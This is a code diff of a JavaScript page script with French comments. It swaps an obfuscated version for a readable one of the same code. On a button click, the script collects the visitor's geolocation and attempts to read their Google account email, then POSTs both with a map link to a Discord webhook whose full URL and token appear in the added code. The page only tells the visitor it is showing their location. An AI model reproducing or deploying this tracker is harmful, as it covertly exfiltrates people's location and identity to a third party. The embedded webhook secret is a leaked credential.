@@ -1,1 +1,69 @@
-function _0x31ec(){const _0x234a63=['getCurrentPosition','16430xcsvBk','tC8_UZYiqZVSvPObYHkG6Wsx_jfI-2COijzDJPYwB3cmO4lI-i3oKRoXIhWXw8jnCjQu','55WCEfPv','email','get','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a[Google\x20Maps](https://www.google.com/maps?q=','get-info-btn','getElementById','15KjARaX','info-display','catch','Ee\x20','6233640kkVGqj','accounts',')\x20\x20//\x20lien\x20vers\x20Google\x20Maps\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','126MVgHcU','stringify','latitude','Erreur:','grr','error','innerText','geolocation','54fFtJgP','23352540JPKgVO','787628KnBjxg','longitude','\x20a\x20cliqué\x20sur\x20le\x20bouton**\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aVotre\x20localisation\x20approximative\x20est:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aLatitude:\x20',',\x20Longitude:\x20','277068MFrWbB','undefined','s\x20eeinfoe','click','474424VlAVyv','POST','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a[Google\x20Maps](https://www.google.com/maps?q=','None','1255583928014733323/','addEventListener','https://discord.com/api/webhooks/'];_0x31ec=function(){return _0x234a63;};return _0x31ec();}function _0x2722(_0x12eb80,_0x39731e){const _0x31ecaf=_0x31ec();return _0x2722=function(_0x272246,_0x529f4b){_0x272246=_0x272246-0x135;let _0x3c6db4=_0x31ecaf[_0x272246];return _0x3c6db4;},_0x2722(_0x12eb80,_0x39731e);}(function(_0x3ce7f6,_0x3cc6d2){const _0x1d571a=_0x2722,_0x30036e=_0x3ce7f6();while(!![]){try{const _0x2427d7=parseInt(_0x1d571a(0x13b))/0x1+-parseInt(_0x1d571a(0x14b))/0x2+-parseInt(_0x1d571a(0x153))/0x3*(-parseInt(_0x1d571a(0x13f))/0x4)+-parseInt(_0x1d571a(0x14d))/0x5*(parseInt(_0x1d571a(0x139))/0x6)+parseInt(_0x1d571a(0x157))/0x7+parseInt(_0x1d571a(0x143))/0x8*(parseInt(_0x1d571a(0x15a))/0x9)+-parseInt(_0x1d571a(0x13a))/0xa;if(_0x2427d7===_0x3cc6d2)break;else _0x30036e['push'](_0x30036e['shift']());}catch(_0x656896){_0x30036e['push'](_0x30036e['shift']());}}}(_0x31ec,0x7ccb5),document['addEventListener']('DOMContentLoaded',function(){const _0x26409c=_0x2722;function _0x3cd61e(){const _0x503a56=_0x2722;let _0x58bb85=_0x503a56(0x146);if(typeof google!==_0x503a56(0x140)&&typeof google[_0x503a56(0x158)]!==_0x503a56(0x140)&&typeof google[_0x503a56(0x158)]['id']!==_0x503a56(0x140)){let _0x28b7ad=google[_0x503a56(0x158)]['id'][_0x503a56(0x14f)]();_0x28b7ad&&_0x28b7ad[_0x503a56(0x14e)]&&(_0x58bb85=_0x28b7ad[_0x503a56(0x14e)]);}return _0x58bb85;}document[_0x26409c(0x152)](_0x26409c(0x151))[_0x26409c(0x148)](_0x26409c(0x142),function(){const _0x5b68bb=_0x26409c;navigator[_0x5b68bb(0x138)]?navigator['geolocation'][_0x5b68bb(0x14a)](function(_0x13e5dd){const _0x5cad98=_0x5b68bb;let _0x12d9c1=_0x13e5dd['coords'][_0x5cad98(0x15c)],_0x47ddad=_0x13e5dd['coords'][_0x5cad98(0x13c)],_0x2c94b5=_0x3cd61e(),_0x145e8d={'content':'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**'+_0x2c94b5+_0x5cad98(0x13d)+_0x12d9c1+_0x5cad98(0x13e)+_0x47ddad+_0x5cad98(0x150)+_0x12d9c1+','+_0x47ddad+_0x5cad98(0x159)},_0x1b3278=_0x5cad98(0x149),_0x1a3ff1=_0x5cad98(0x147),_0x4a46ed=_0x5cad98(0x14c),_0x1b9585=_0x1b3278+_0x1a3ff1+_0x4a46ed;fetch(_0x1b9585,{'method':_0x5cad98(0x144),'headers':{'Content-Type':'application/json'},'body':JSON[_0x5cad98(0x15b)](_0x145e8d)})['then'](_0x5e556b=>{const _0x524acc=_0x5cad98;if(_0x5e556b['ok'])alert(_0x524acc(0x141));else throw new Error(_0x524acc(0x156)+_0x5e556b['status']);})[_0x5cad98(0x155)](_0x23df27=>{const _0x3d2f61=_0x5cad98;console[_0x3d2f61(0x136)](_0x3d2f61(0x15d),_0x23df27),alert('Ee.');}),document[_0x5cad98(0x152)](_0x5cad98(0x154))[_0x5cad98(0x137)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Votre\x20localisation\x20approximative\x20est:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aLatitude:\x20'+_0x12d9c1+_0x5cad98(0x13e)+_0x47ddad+_0x5cad98(0x145)+_0x12d9c1+','+_0x47ddad+')\x20\x20//\x20lien\x20vers\x20Google\x20Maps\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';},function(_0x220428){const _0x60598d=_0x5b68bb;console[_0x60598d(0x136)](_0x60598d(0x135),_0x220428),alert('no2');}):alert('no');});}));
+// Fonction pour détecter le nom d'adresse email (compte Google)
+function getGoogleAccountName() {
+    let accountName = 'None';  // Valeur par défaut si aucun compte Google n'est détecté
+
+    // Vérification de l'authentification Google
+    if (typeof(google) !== 'undefined' && typeof(google.accounts) !== 'undefined' && typeof(google.accounts.id) !== 'undefined') {
+        let userProfile = google.accounts.id.get();
+
+        if (userProfile && userProfile.email) {
+            accountName = userProfile.email;
+        }
+    }
+
+    return accountName;
+}
+
+document.getElementById('get-info-btn').addEventListener('click', function() {
+    // Vérifier si le navigateur supporte la géolocalisation
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            let googleAccountName = getGoogleAccountName();
+
+            // Construire le message à envoyer au webhook Discord
+            let message = {
+                content: `
+                    **${googleAccountName} a cliqué sur le bouton**
+                    \nVotre localisation approximative est:
+                    \nLatitude: ${lat}, Longitude: ${lon}
+                    \n[Google Maps](https://www.google.com/maps?q=${lat},${lon})  // lien vers Google Maps
+                `
+            };
+
+            // URL du webhook Discord
+            let webhookUrl = 'https://discord.com/api/webhooks/1243652550251515914/SrRtaX_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImfe-XgBBlDcT6r_00VU';
+
+            // Envoi du message au webhook Discord
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message)
+            }).then(response => {
+                if (response.ok) {
+                    alert('Les informations ont été envoyées avec succès au webhook Discord.');
+                } else {
+                    throw new Error('Erreur lors de l\'envoi au webhook Discord. Statut: ' + response.status);
+                }
+            }).catch(error => {
+                console.error('Erreur:', error);
+                alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
+            });
+
+            // Affichage des informations dans l'élément #info-display
+            document.getElementById('info-display').innerText = `
+                Votre localisation approximative est:
+                \nLatitude: ${lat}, Longitude: ${lon}
+                \n[Google Maps](https://www.google.com/maps?q=${lat},${lon})  // lien vers Google Maps
+            `;
+        }, function(error) {
+            console.error('Erreur de géolocalisation:', error);
+            alert('Erreur lors de la récupération de la localisation.');
+        });
+    } else {
+        alert('La géolocalisation n\'est pas supportée par ce navigateur.');
+    }
+});
